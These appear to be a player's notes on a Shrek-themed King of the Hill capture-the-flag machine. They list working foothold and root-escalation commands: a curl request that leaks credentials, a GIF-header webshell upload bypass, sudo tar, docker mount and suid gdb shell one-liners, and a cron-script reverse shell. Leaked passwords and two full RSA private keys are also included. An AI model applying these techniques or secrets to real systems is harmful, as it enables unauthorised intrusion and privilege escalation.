# Shrek KOTH machine

paths to foothold:

- on port 80, under `/api` there is a custom service that reveals the ftp credentials. post `search=f` to /api/search.php to reveal them. this allows access to ftp, where there is a text file containing creds for user `donkey`
  - `curl -d "search=f" http://10.10.218.158/api/search.php`
  - might return `ftp:EkRYje58bhFpg2uW`
  - message.txt contains `J5rURvCa8DyTg3vR`

these have been consistent over at least two games

- on port 80, `/upload` contains a file upload that checks for gif or png header. uploading a webshell that starts with `GIF87a` will pass the gif check and be placed under `/upload/uploads`. the webshell will execute as `donkey`
- `robots.txt` reveals a text file containing the ssh private key of user `shrek`
- on high port `65432` (possibly random) runs a limited bind shell for user `puss`

paths to root:

- donkey can run tar as root. therefore `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` will escalate
- shrek has a `check.sh` script in his home folder, that appears to be run by root every minute and which he can alter with a rev shell script or similar
- puss is a member of the docker group, and can get a root shell via `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
- `gdb` has the suid bit set. any user can get root via `./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit`

other things:

- `run-parts` has the suid bit set, but couldnt work out how to escalate it as it doesnt support the options gtfobins suggests. getting it to run a shell script does not preserve privileges
- cms made simple 2.2.8 is running under /cms on port 80. this has rce if the creds can be guessed - the hash in the db was not crackable
- tomcat is on 8080/8009. maybe ghostcat?

## flags

- /root/root.txt
- /home/shrek/flag.txt
- /home/donkey/flag.txt
- /home/puss/flag.txt
- /srv/web/flag.txt
- mysql, 'flag' table in cms database (thanks to mug3njutsu on discord for this)

## ssh keys

shrek:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAsKHyvIOqmETYwUvLDAWg4ZXHb/oTgk7A4vkUY1AZC0S6fzNE
JmewL2ZJ6ioyCXhFmvlA7GC9iMJp13L5a6qeRiQEVwp6M5AYYsm/fTWXZuA2Qf4z
8o+cnnD+nswE9iLe5xPl9NvvyLANWNkn6cHkEOfQ1HYFMFP+85rmJ2o1upHkgcUI
ONDAnRigLz2IwJHeZAvllB5cszvmrLmgJWQg2DIvL/2s+J//rSEKyISmGVBxDdRm
T5ogSbSeJ9e+CfHtfOnUShWVaa2xIO49sKtu+s5LAgURtyX0MiB88NfXcUWC7uO0
Z1hd/W/rzlzKhvYlKPZON+J9ViJLNg36HqoLcwIDAQABAoIBABaM5n+Y07vS9lVf
RtIHGe4TAD5UkA8P3OJdaHPxcvEUWjcJJYc9r6mthnxF3NOGrmRFtDs5cpk2MOsX
u646PzC3QnKWXNmeaO6b0T28DNNOhr7QJHOwUA+OX4OIio2eEBUyXiZvueJGT73r
I4Rdg6+A2RF269yqrJ8PRJj9n1RtO4FPLsQ/5d6qxaHp543BMVFqYEWvrsdNU2Jl
VUAB652BcXpBuJALUV0iBsDxbqIKFl5wIsrTNWh+hkUTwo9HroQEVd4svCN+Jr5B
Npr81WG2jbKqOx2kJVFW/yCivmr/f/XokyOLBi4N/5Wqq+JuHD0zSPTtY5K04SUd
63TWQ5kCgYEA32IwfmDwGZBhqs3+QAH7y46ByIOa632DnZnFu2IqKySpTDk6chmh
ONSfc4coKwRq5T0zofHIKLYwO8vVpJq4iQ31r+oe7fAHh08w/mBC3ciCSi6EQdm5
RMxW0i4usAuneJ04rVmWWHepADB0BqYiByWtWFYAY9Kpks/ks9yWHn8CgYEAymxD
q3xvaWFycawJ+I/P5gW8+Wr1L3VrGbBRj1uPhNF0yQcA03ZjyyViDKeT/uBfCCxX
LPoLmoLYGmisl/MGq3T0g0TtrgvkFU6qZ3sjYJ+O/yrT06HYapJLv6Ns/+98uNvi
3VEQodZNII8P6WLk3RPp1NzDVcFDLmD9C40UAQ0CgYBokPgOUKZT8Sgm4mJ/5+3M
LZtHF4PvdEOmBJNw0dTXeUPesHNRcfnsNmulksEU0e6P/IQs7Jc7p30QoKwTb3Gu
hmBZxohP7So5BrLygHEMjI2g2AGFKbv2HokNvhyQwAPXDBG549Pi+bCcrBHEAwSu
v85TKX7pO3WxiauPHlUPVQKBgFmIF0ozKKgIpPDoMiTRnxfTc+kxyK6sFanwFbL9
wXXymuALi+78D1mb+Ek2mbwDC6V2zzwigJ1fwCu2Hpi6sjmF6lxhUWtI8SIHgFFy
4ovrJvlvvO9/R1SjzoM9yolNKPIut6JCJ8QdIFIFVPlad3XdR/CRkIhOieNqnKHO
TYnFAoGAbRrJYVZaJhVzgg7H22UM+sAuL6TR6hDLqD2wA1vnQvGk8qh95Mg9+M/X
6Zmia1R6Wfm2gIGirxK6s+XOpfqKncFmdjEqO+PHr4vaKSONKB0GzLI7ZlOPPU5V
Q2FZnCyRqaHlYUKWwZBt2UYbC46sfCWapormgwo3xA8Ix/jrBBI=
-----END RSA PRIVATE KEY-----
```

puss

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA3rYTsWn7Rc0ShhrLf5SM5lDLQFw6tuAmckGG7q7tsgDxzIBE
IpVkn8Y4XX8ZPnOOrzzw9NYS+jUNb0+3QxpRv576QsOmlkSoSLcxNfOLPKpqsAAJ
uJ7Bl8LhVfh23aSL5z2TYeeTSrPq5rxcWQE/hmq0kF8WChppEXaxhHjB7zhlj8in
XiOUtPxFFe9xgm6UQeSdV8M8SS6dG5EN1NUTf5I1EmzwK+RWzVp52GOlonyDr0gU
FueAvjvi9ZuEg6tcOjgxhFZOjf9HLUW+1e8hW9GfEqTya+nisTfguHoG+GvpXB0C
LqpY91hQtr1J0i29mdLGAJ048/amczjMuJmCNQIDAQABAoIBAElF6nDCh7NNZzzL
8AwHmdvk1RpVvdORJ9ULjhNVZkrcWLGJueEO+c4/bygDuxB7AITTLgu/qvq7HbJz
rb3cGO1MptX0fQiPijZyXzR67mKFRxikyo39XYBK08xvNNxzWLw53BWoFSPM0goc
Ct4VtQrKbKHbRusICW1/eaQ1/shvTnsePTpWJ7MRUNIk7nCMxeq/t7pw7I9ju3mI
gGM+uz2ZJzZOqJx/x0ogQDPJoIEd2Q7Z9twQ7+S4+rKQPz22mW+qYDq11OWVb0Ef
LLRZ+ue5asHZ2HzKWLbEy3WCSPQNVk4cYm4CyvDSvzV9GCukUVTypKaeXNrK4qJ8
TnVY78ECgYEA9drZ5IF0J2qfMgra5/TRpI+aTVO/NXWhxaRmoyh6Af60gfNLnWKp
J+qJFqZuf3Qwtencv3ocSraVeh0r3aM+LDUYD/LSOnUaj1iY2ckCArZ8KOXGH6i7
AdUqQZzqoJuUb3ztg1Nhu2iWs/3ezz6l1yOvCP9m5020RAqX3DSJkskCgYEA5+a9
+948bVjiPYfFSq5qNd647+RhBpvjJW482BhujsHB+qY+VFbqc3bOIWVeXKTmjQ5y
vhbrUL9h1ulCriSsRAK0qQwW4LH6AgFJvFUm4KZf849iG6dLyFE4H4sYgDGZBW44
WJ8lRVkGJCnexI73R1oMizILasg9/5BR50Jdng0CgYEAtUop/ivPQPmIZlhGz2Bh
7pzNxVOJ3ZveLGVsIcfJIAt3g5OqIGYOIhb5+6/CL024VYwbcT5T+mvkkWVNYWPs
hqCoG6qMhvqvGSDVpVJpnyJ9L5Mvo0zCiTlsrXFOOhw/Om6+nWYw3QbkidkcIWoq
1BfGDDZ45PsRgFLnZEOBZrECgYAK5DVsDOX9pL0LcsL7XPG0Ef/RlIJSEyQ579F/
vLYEkmkP4pruzx43yg6oVuB1rXD+kv0knGL06egoddAh6asFjrL5dY3lg7ZgPbs+
0yj+SBIdmFBdSCAxCk9+e8Ps0WeEb8bJsr/HYAT/0c+an7RRb5NDPlh27WysAhU2
rVFESQKBgGIQ4dIwhiaX7KVyG1QleWC8tJw6sMbzr3R1VKrKAV7NHOcBVfms9/bP
FhZrnDGHKkUAWZ6klGaTHcvq8fK6bas5LKkrNo5DPaiQFbD7x5Lyx4PdPupnxi91
k0hrZqy9vjpxtyIj8tfb3ccPeBiRYDwDyiiPmccOBRHJDwD+S89z
-----END RSA PRIVATE KEY-----
```
